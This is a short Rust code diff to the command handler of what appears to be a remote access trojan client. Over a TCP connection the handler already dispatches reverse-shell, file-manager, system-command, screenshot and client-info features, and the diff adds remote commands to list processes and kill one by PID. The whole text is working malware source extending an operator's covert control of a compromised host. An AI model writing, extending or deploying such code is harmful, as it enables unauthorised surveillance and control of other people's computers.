@@ -8,6 +8,7 @@ use crate::features::reverse_shell::{start_shell, exit_shell, execute_shell_comm
 use crate::features::file_manager::file_manager;
 use crate::features::system_commands::system_commands;
 use crate::features::other::{take_screenshot, client_info};
+use crate::features::process::{process_list, kill_process};
 
 pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
     match command {
@@ -22,6 +23,11 @@ pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell:
         _ if command.starts_with("take_screenshot") => {
             let display = command["take_screenshot::".len()..].parse::<i32>().unwrap();
             take_screenshot(write_stream, display);
+        },
+        "process_list" => process_list(write_stream),
+        _ if command.starts_with("kill_process") => {
+            let pid = command["kill_process::".len()..].parse::<usize>().unwrap();
+            kill_process(pid);
         },
         "start_shell" => {
             let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
